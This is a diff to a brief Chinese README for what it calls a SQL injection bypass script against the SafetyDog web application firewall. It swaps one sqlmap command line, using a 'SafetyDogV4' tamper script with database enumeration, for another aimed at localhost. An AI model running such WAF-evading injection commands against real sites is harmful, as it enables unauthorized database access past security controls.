@@ -1,3 +1,4 @@
 # 最新版本安全狗sql注入绕过脚本
-获取数据库
-python sqlmap.py -u "http://xxx?id=1" -p id --tamper=SafetyDogV4 -v3 --dbs --fresh-queries
+
+
+python sqlmap.py -u "http://127.0.0.1/id.php?id=1" --tamper=SafetyDogV4 --random-agent -v3 --fresh-queries
